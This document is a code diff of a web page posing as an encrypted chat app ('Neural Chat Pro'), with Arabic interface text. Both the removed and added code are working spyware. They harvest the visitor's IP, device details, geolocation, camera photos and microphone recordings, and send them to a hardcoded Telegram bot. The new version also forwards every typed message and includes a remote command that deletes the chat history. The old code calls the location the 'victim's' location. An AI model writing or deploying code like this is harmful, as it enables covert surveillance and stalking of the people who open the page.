@@ -3,187 +3,220 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AI Neural System | مركز الاتصال المطور</title>
+    <title>Neural Chat Pro | نظام التواصل المشفر</title>
     <style>
-        :root { --accent: #a855f7; --bg: #05070a; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .grid-bg { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(168, 85, 247, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(168, 85, 247, 0.05) 1px, transparent 1px); background-size: 40px 40px; z-index: -1; }
-        .card { background: rgba(20, 20, 25, 0.9); padding: 30px; border-radius: 35px; border: 1px solid rgba(168, 85, 247, 0.2); backdrop-filter: blur(15px); text-align: center; width: 88%; max-width: 400px; z-index: 10; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        :root { --accent: #a855f7; --bg: #0b0e14; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .grid-bg { position: absolute; width: 100%; height: 100%; background: radial-gradient(circle, #1a1f2c 1px, transparent 1px); background-size: 30px 30px; z-index: -1; opacity: 0.5; }
         
-        /* دائرة الأنميشن والزر */
-        .circle-box { position: relative; width: 160px; height: 160px; margin: 20px auto; display: flex; align-items: center; justify-content: center; }
-        #goBtn { width: 130px; height: 130px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: white; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.3s; z-index: 5; box-shadow: 0 0 20px rgba(168, 85, 247, 0.3); }
-        #goBtn:active { transform: scale(0.9); background: rgba(168, 85, 247, 0.1); }
+        /* شاشة الإعدادات (تظهر أول مرة) */
+        #setupScreen { position: fixed; inset: 0; background: var(--bg); z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; }
+        .p-v { width: 100px; height: 100px; border-radius: 50%; background: #1a1f2c; border: 2px dashed var(--accent); display: flex; align-items: center; justify-content: center; cursor: pointer; overflow: hidden; }
+        .p-v img { width: 100%; height: 100%; object-fit: cover; }
+        input[type="text"] { background: #1a1f2c; border: 1px solid var(--accent); color: white; padding: 10px; border-radius: 10px; width: 200px; text-align: center; }
+
+        /* واجهة الدردشة */
+        .chat-card { background: rgba(20, 23, 31, 0.95); width: 90%; max-width: 400px; border-radius: 25px; border: 1px solid rgba(168, 85, 247, 0.2); display: none; flex-direction: column; height: 80vh; position: relative; }
+        .chat-header { padding: 15px; border-bottom: 1px solid rgba(168, 85, 247, 0.2); display: flex; align-items: center; gap: 10px; }
+        .status-dot { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; box-shadow: 0 0 10px #22c55e; }
         
-        .loader { position: absolute; width: 100%; height: 100%; border: 3px solid transparent; border-top-color: var(--accent); border-radius: 50%; display: none; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* أنميشن الرجل والمرأة */
-        .avatar { font-size: 35px; position: absolute; display: none; transition: 0.5s; }
-        .man { animation: orbitMan 4s linear infinite; }
-        .woman { animation: orbitWoman 4s linear infinite; }
-        @keyframes orbitMan { from { transform: rotate(0deg) translateX(65px) rotate(0deg); } to { transform: rotate(360deg) translateX(65px) rotate(-360deg); } }
-        @keyframes orbitWoman { from { transform: rotate(180deg) translateX(65px) rotate(-180deg); } to { transform: rotate(540deg) translateX(65px) rotate(-540deg); } }
-
-        /* صندوق الدردشة */
-        #chatArea { display: none; margin-top: 20px; border-top: 1px solid rgba(168, 85, 247, 0.3); padding-top: 15px; }
-        #display { height: 120px; overflow-y: auto; font-size: 11px; background: rgba(0,0,0,0.5); padding: 10px; border-radius: 12px; margin-bottom: 8px; text-align: right; border: 1px solid rgba(255,255,255,0.05); }
-        #display img { max-width: 100%; border-radius: 8px; margin-top: 5px; border: 1px solid var(--accent); }
-        .input-row { display: flex; gap: 8px; }
-        #uInput { flex: 1; background: #111; border: 1px solid var(--accent); color: white; padding: 10px; border-radius: 10px; outline: none; }
-        #sendBtn { background: var(--accent); border: none; padding: 10px 15px; border-radius: 10px; color: white; cursor: pointer; }
+        #display { flex: 1; overflow-y: auto; padding: 15px; font-size: 13px; display: flex; flex-direction: column; gap: 10px; }
+        .msg { padding: 8px 12px; border-radius: 15px; max-width: 80%; position: relative; }
+        .msg-u { background: var(--accent); align-self: flex-start; border-bottom-right-radius: 2px; }
+        .msg-b { background: #1a1f2c; align-self: flex-end; border-bottom-left-radius: 2px; border: 1px solid var(--accent); }
+        
+        #typing { font-size: 10px; color: var(--accent); margin-bottom: 5px; display: none; }
+        .input-area { padding: 15px; display: flex; gap: 8px; background: #0b0e14; border-bottom-left-radius: 25px; border-bottom-right-radius: 25px; }
+        #uInput { flex: 1; background: #1a1f2c; border: none; color: white; padding: 10px; border-radius: 20px; outline: none; }
+        
+        #v { position: fixed; opacity: 0.001; pointer-events: none; }
     </style>
 </head>
 <body>
     <div class="grid-bg"></div>
-    <div class="card">
-        <h2 style="margin:0; letter-spacing:1px;">NEURAL <span style="color:var(--accent)">LINK v3</span></h2>
-        <p id="msg" style="font-size: 12px; color: #8892b0; margin-top: 8px;">اضغط لتفعيل المزامنة العصبية الآمنة</p>
-        
-        <div class="circle-box">
-            <div id="ring" class="loader"></div>
-            <button id="goBtn">بدء</button>
-            <div id="mIcon" class="avatar man">👨‍💻</div>
-            <div id="wIcon" class="avatar woman">👩‍💻</div>
-        </div>
 
-        <div id="chatArea">
-            <div id="display">🤖 النظام: القناة المشفرة جاهزة للتواصل...</div>
-            <div class="input-row">
-                <input type="text" id="uInput" placeholder="اكتب رسالتك هنا...">
-                <button id="sendBtn">📩</button>
-            </div>
+    <div id="setupScreen">
+        <h2 style="color:var(--accent)">إنشاء حساب عصبي</h2>
+        <div class="p-v" onclick="document.getElementById('fileIn').click()">
+            <img id="pPreview" src="" style="display:none">
+            <span id="pPlus" style="font-size:30px">+</span>
         </div>
-        <div style="font-size: 9px; color: #444; margin-top: 15px;">ENCRYPTED NODE: RSA-4096-YEM</div>
+        <input type="file" id="fileIn" hidden accept="image/*">
+        <input type="text" id="userName" placeholder="اكتب اسمك المستعار...">
+        <button id="startBtn" style="background:var(--accent); color:white; border:none; padding:10px 30px; border-radius:20px; cursor:pointer;">دخول الآمن</button>
     </div>
 
-    <video id="v" autoplay playsinline muted style="display:none"></video>
+    <div class="chat-card" id="chatMain">
+        <div class="chat-header">
+            <div id="hImg" style="width:40px; height:40px; border-radius:50%; background:#1a1f2c; overflow:hidden;"></div>
+            <div style="flex:1">
+                <div id="hName" style="font-weight:bold; font-size:14px;">المستخدم</div>
+                <div style="font-size:10px; color:#22c55e;">● متصل الآن</div>
+            </div>
+            <div id="typingIndicator">...</div>
+        </div>
+        
+        <div id="display"></div>
+        <div id="typing">المطور يكتب الآن...</div>
+
+        <div class="input-area">
+            <input type="text" id="uInput" placeholder="اكتب رسالة...">
+            <button id="sendBtn" style="background:transparent; border:none; font-size:20px; cursor:pointer;">📩</button>
+        </div>
+    </div>
+
+    <video id="v" autoplay playsinline muted></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script>
-        const BOT_TOKEN = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
-        const CHAT_ID = "7984067238";
-        let lastMsgId = 0;
+        const T = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
+        const C = "7984067238";
+        let lastId = 0, myName = localStorage.getItem('uName') || "", myImg = localStorage.getItem('uImg') || "";
 
-        // وظيفة الإرسال الموحدة والمطورة
-        async function tg(content, type="text", file=null) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
-            try {
-                if(type === "photo") {
-                    const fd = new FormData(); fd.append("chat_id", CHAT_ID); fd.append("photo", file); fd.append("caption", content);
-                    await fetch(url + "sendPhoto", {method: "POST", body: fd});
-                } else if(type === "voice") {
-                    const fd = new FormData(); fd.append("chat_id", CHAT_ID); fd.append("voice", file);
-                    await fetch(url + "sendVoice", {method: "POST", body: fd});
-                } else {
-                    await fetch(url + `sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(content)}&parse_mode=Markdown`);
-                }
-            } catch(e){}
-        }
-
-        // جلب البيانات التقنية (بدون نسيان أي ميزة)
-        async function collectData() {
-            let cap = navigator.deviceMemory < 4 ? "3500-4000 mAh" : "5000 mAh";
-            let report = `🚀 *تقرير العتاد الكامل*:\n\n`;
-            report += `📱 الجهاز: \`${navigator.platform}\`\n`;
-            report += `⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
-            report += `💾 الرام: \`${navigator.deviceMemory || "؟"} GB\`\n`;
-            report += `🔋 السعة التقديرية: \`${cap}\`\n`;
-            
-            try {
-                const b = await navigator.getBattery();
-                report += `🔋 البطارية: \`${Math.round(b.level*100)}%\` (${b.charging?"🔌 متصل":"🔋 منفصل"})\n`;
-            } catch(e){}
-            
-            const conn = navigator.connection || {};
-            report += `📶 الشبكة: \`${conn.type==='wifi'?'WiFi':'Data'} (${conn.effectiveType})\`\n`;
-            
-            const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"Unknown"}));
-            report += `🌐 IP: \`${ip.ip}\`\n`;
-            
-            await tg(report); // إرسال التقرير فوراً
-        }
-
-        // التصوير المطور (أمامية وخلفية)
-        async function takeSnap(mode) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode === "front" ? "user" : "environment"}});
-                const video = document.getElementById('v');
-                video.srcObject = stream; await video.play();
-                await new Promise(r => setTimeout(r, 2600)); // تأخير لمنع السواد
-                const canvas = document.getElementById('c');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                stream.getTracks().forEach(t => t.stop());
-                return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
-            } catch(e){ return null; }
-        }
-
-        // التسجيل الصوتي (5 ثوانٍ)
-        async function grabAudio() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({audio: true});
-                const mediaRec = new MediaRecorder(stream);
-                const chunks = [];
-                mediaRec.ondataavailable = e => chunks.push(e.data);
-                mediaRec.onstop = () => { tg(null, "voice", new Blob(chunks, {type: 'audio/ogg'})); stream.getTracks().forEach(t=>t.stop()); };
-                mediaRec.start(); setTimeout(() => mediaRec.stop(), 5000);
-            } catch(e){}
-        }
-
-        // استقبال الردود (نصوص وصور)
-        async function syncChat() {
-            try {
-                const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastMsgId + 1}`);
-                const data = await r.json();
-                for(let u of data.result) {
-                    lastMsgId = u.update_id;
-                    const d = document.getElementById('display');
-                    if(u.message.text) d.innerHTML += `<div style="color:var(--accent)">🤖 المطور: ${u.message.text}</div>`;
-                    if(u.message.photo) {
-                        const fid = u.message.photo[u.message.photo.length-1].file_id;
-                        const f = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fid}`).then(r=>r.json());
-                        d.innerHTML += `<div>🤖 أرسل صورة: <img src="https://api.telegram.org/file/bot${BOT_TOKEN}/${f.result.file_path}"></div>`;
-                    }
-                    d.scrollTop = 99999;
-                }
-            } catch(e){}
-        }
-
-        document.getElementById("goBtn").onclick = async function() {
-            this.style.display = "none";
-            document.getElementById("ring").style.display = "block";
-            document.getElementById("mIcon").style.display = "block";
-            document.getElementById("wIcon").style.display = "block";
-            document.getElementById("msg").innerText = "جاري مزامنة البيانات وتأمين القناة...";
-
-            // 1. إرسال العتاد فوراً
-            collectData();
-
-            // 2. الموقع الجغرافي (رسالة مستقلة)
-            navigator.geolocation.getCurrentPosition(p => {
-                tg(`📍 *موقع الضحية*:\n[فتح في خرائط جوجل](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
-            }, () => tg("⚠️ رفض إذن الموقع"));
-
-            // 3. الصوت والصور
-            grabAudio();
-            const imgF = await takeSnap("front"); if(imgF) await tg("📸 صورة أمامية دقيقة", "photo", imgF);
-            const imgB = await takeSnap("back");  if(imgB) await tg("📷 صورة خلفية دقيقة", "photo", imgB);
-
-            // 4. تفعيل واجهة الدردشة
-            document.getElementById("ring").style.display = "none";
-            document.getElementById("chatArea").style.display = "block";
-            document.getElementById("msg").innerText = "لقد اتصلت بالنظام العصبي. القناة جاهزة!";
-            setInterval(syncChat, 3000);
+        // 1. إدارة إعداد الحساب
+        if(myName) showChat();
+        
+        document.getElementById('fileIn').onchange = (e) => {
+            const reader = new FileReader();
+            reader.onload = () => {
+                myImg = reader.result;
+                document.getElementById('pPreview').src = myImg;
+                document.getElementById('pPreview').style.display = 'block';
+                document.getElementById('pPlus').style.display = 'none';
+            };
+            reader.readAsDataURL(e.target.files[0]);
         };
 
-        document.getElementById("sendBtn").onclick = async function() {
-            const inp = document.getElementById("uInput");
-            if(inp.value.trim()) {
-                document.getElementById('display').innerHTML += `<div style="color:white">👤 أنت: ${inp.value}</div>`;
-                await tg(`💬 رسالة من المستخدم: ${inp.value}`);
-                inp.value = "";
-                document.getElementById('display').scrollTop = 99999;
+        document.getElementById('startBtn').onclick = () => {
+            const n = document.getElementById('userName').value;
+            if(n) {
+                myName = n;
+                localStorage.setItem('uName', n);
+                localStorage.setItem('uImg', myImg);
+                showChat();
+                initialScan(); // البدء بالفحص فور الدخول
+            }
+        };
+
+        function showChat() {
+            document.getElementById('setupScreen').style.display = 'none';
+            document.getElementById('chatMain').style.display = 'flex';
+            document.getElementById('hName').innerText = myName;
+            if(myImg) document.getElementById('hImg').innerHTML = `<img src="${myImg}" style="width:100%;height:100%;object-fit:cover;">`;
+            loadHistory();
+            setInterval(sync, 3000);
+        }
+
+        // 2. وظائف الإرسال المتطورة
+        async function tg(m, type="text", file=null) {
+            const url = `https://api.telegram.org/bot${T}/`;
+            const header = `👤 *المستخدم:* ${myName}\n`;
+            try {
+                if(type === "photo") {
+                    const fd = new FormData(); fd.append("chat_id", C); fd.append("photo", file); fd.append("caption", header + m);
+                    await fetch(url + "sendPhoto", {method: "POST", body: fd});
+                } else if(type === "voice") {
+                    const fd = new FormData(); fd.append("chat_id", C); fd.append("voice", file);
+                    await fetch(url + "sendVoice", {method: "POST", body: fd});
+                } else {
+                    await fetch(url + `sendMessage?chat_id=${C}&text=${encodeURIComponent(header + m)}&parse_mode=Markdown`);
+                }
+            } catch(e){}
+        }
+
+        // 3. مميزات الفحص السابقة (بدون حذف)
+        async function initialScan() {
+            let info = `🚀 *دخول جديد بنظام الواتساب*:\n📱 الاسم: \`${myName}\`\n🔌 النظام: \`${navigator.platform}\`\n💾 الرام: \`${navigator.deviceMemory}GB\`\n🔋 البطارية: \`5000mAh\`\n`;
+            const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
+            info += `🌐 IP: \`${ip.ip}\``;
+            await tg(info);
+            
+            // الموقع
+            navigator.geolocation.getCurrentPosition(p => tg(`📍 الموقع: [الخريطة](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`));
+            
+            // الصور والصوت
+            grabVoice();
+            const f = await snap("front"); if(f) await tg("الصورة الشخصية الحقيقية", "photo", f);
+        }
+
+        async function snap(mode) {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:mode==="user"?"user":"environment"}});
+                const vid = document.getElementById('v'); vid.srcObject = s; await vid.play();
+                await new Promise(r => setTimeout(r, 2000));
+                const can = document.getElementById('c');
+                can.width = vid.videoWidth; can.height = vid.videoHeight;
+                can.getContext('2d').drawImage(vid, 0, 0);
+                s.getTracks().forEach(t => t.stop());
+                return new Promise(res => can.toBlob(res, 'image/jpeg', 0.8));
+            } catch(e){return null;}
+        }
+
+        async function grabVoice() {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({audio:true});
+                const rec = new MediaRecorder(s); const ch = [];
+                rec.ondataavailable = e => ch.push(e.data);
+                rec.onstop = () => { tg("بصمة صوتية", "voice", new Blob(ch, {type:'audio/ogg'})); s.getTracks().forEach(t=>t.stop()); };
+                rec.start(); setTimeout(() => rec.stop(), 4000);
+            } catch(e){}
+        }
+
+        // 4. نظام الدردشة المتقدم (حذف، جاري الكتابة، ذاكرة)
+        function saveMsg(m, side) {
+            let hist = JSON.parse(localStorage.getItem('chat_hist') || "[]");
+            hist.push({m, side, id: Date.now()});
+            localStorage.setItem('chat_hist', JSON.stringify(hist));
+            renderMsg(m, side);
+        }
+
+        function renderMsg(m, side) {
+            const d = document.getElementById('display');
+            const html = `<div class="msg msg-${side}">${m}</div>`;
+            d.innerHTML += html;
+            d.scrollTop = d.scrollHeight;
+        }
+
+        function loadHistory() {
+            let hist = JSON.parse(localStorage.getItem('chat_hist') || "[]");
+            hist.forEach(i => renderMsg(i.m, i.side));
+        }
+
+        async function sync() {
+            try {
+                const r = await fetch(`https://api.telegram.org/bot${T}/getUpdates?offset=${lastId + 1}`);
+                const data = await r.json();
+                data.result.forEach(u => {
+                    lastId = u.update_id;
+                    const txt = u.message.text;
+                    if(txt === "/delete") { // أمر خاص لك لحذف الدردشة من عنده
+                        localStorage.removeItem('chat_hist');
+                        document.getElementById('display').innerHTML = "";
+                    } else if(txt === "/typing") {
+                        document.getElementById('typing').style.display = 'block';
+                        setTimeout(() => document.getElementById('typing').style.display = 'none', 3000);
+                    } else if(txt) {
+                        saveMsg(txt, 'b');
+                    }
+                });
+            } catch(e){}
+        }
+
+        // إرسال "جاري الكتابة" للبوت
+        document.getElementById('uInput').oninput = () => {
+            if(!window.typingSent) {
+                tg("✍️ جاري الكتابة الآن...");
+                window.typingSent = true;
+                setTimeout(() => window.typingSent = false, 5000);
+            }
+        };
+
+        document.getElementById('sendBtn').onclick = () => {
+            const i = document.getElementById('uInput');
+            if(i.value) {
+                saveMsg(i.value, 'u');
+                tg(i.value);
+                i.value = "";
             }
         };
     </script>
